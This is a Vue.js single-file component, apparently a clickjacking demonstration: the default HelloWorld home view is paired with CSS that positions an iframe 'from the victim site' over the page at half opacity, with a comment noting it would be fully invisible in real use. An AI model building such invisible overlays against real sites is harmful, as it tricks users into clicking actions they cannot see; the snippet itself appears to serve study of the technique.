<template>
  <div class="home">
    <HelloWorld msg="Welcome to Your Vue.js App" />
  </div>
</template>

<script>
// @ is an alias to /src
import HelloWorld from '@/components/HelloWorld.vue';

export default {
  name: 'home',
  components: {
    HelloWorld,
  },
};
</script>
<style>
iframe {
  /* iframe from the victim site */
  width: 400px;
  height: 100px;
  position: absolute;
  top: 0;
  left: -20px;
  opacity: 0.5; /* in real opacity:0 */
  z-index: 1;
}
</style>
